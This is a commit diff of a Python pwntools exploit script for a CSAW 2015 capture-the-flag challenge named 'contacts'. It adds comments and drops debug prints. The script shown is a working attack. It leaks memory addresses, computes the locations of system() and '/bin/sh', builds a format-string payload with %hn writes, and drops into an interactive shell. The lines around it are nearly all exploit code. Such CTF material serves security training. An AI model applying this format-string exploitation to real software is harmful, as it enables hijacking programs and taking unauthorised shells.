eb7ca8e35a51248f5a2c72150c974b015cc0c3d8
Damotorie <parksjin01@gmail.com>
2017-04-07 20:13:08 +0900

    Update contacts.py

--- 2015/CSAW/contacts.py
+++ 2015/CSAW/contacts.py
@@ -3,6 +3,8 @@ import time
 
 proc = process("./contacts")
 print proc.recv(1024)
+
+#This is memory leak part
 proc.sendline("1")
 print proc.recv(1024)
 proc.sendline("leak")
@@ -17,13 +19,13 @@ proc.sendline("4")
 tmp = proc.recv(1024).split("\n")
 for i in tmp:
 	if "Description:" in i:
-		#print i.split(' ')
 		trash, ebp, addr, tmp3 = i.split(' ')[1].split('0x')
+		
+#Calculate memory.
 addr = int(addr, 16)
 ebp = int(ebp, 16)
 print hex(ebp)
 ebp = ebp&0xffff
-#ebp = 0xd5a8
 system = addr + 141161
 binsh = addr + 1323508
 system_upper = (system&0xffff0000)>>16
@@ -31,11 +33,13 @@ system_lower = system&0xffff
 binsh_upper = (binsh&0xffff0000)>>16
 binsh_lower = binsh&0xffff
 
+#Delete contacts which is used to leak memory
 proc.sendline("2")
 print proc.recv(1024)
 proc.sendline("leak")
 print proc.recv(1024)
 
+#Attack
 proc.sendline("1")
 print proc.recv(1024)
 proc.sendline("t1")
@@ -138,10 +142,5 @@ print proc.recv(1024)
 proc.sendline("4")
 print proc.recv(100000000).split('\n')[-1]
 proc.sendline("5")
-
-print hex(ebp), hex(system), hex(binsh), hex(int(tmp3, 16))
-print "%",str(ebp+48)+"c"+"%","6$hn"+"%",str(system_lower)+"c"+"%","18$n"+"%",str(ebp+50)+"c"+"%","6$hn"+"%",str(system_upper)+
-"c"+"%","18$n"+"%",str(ebp+58)+"c"+"%","6$hn"+"%",str(binsh_lower)+"c"+"%","18$n"+"%",str(ebp+60)+"c"+"%","6$hn"+"%",str(binsh_
-upper)+"c"+"%","18$n"+"%",str(ebp)+"c"+"%","6$hn"
 
 proc.interactive()
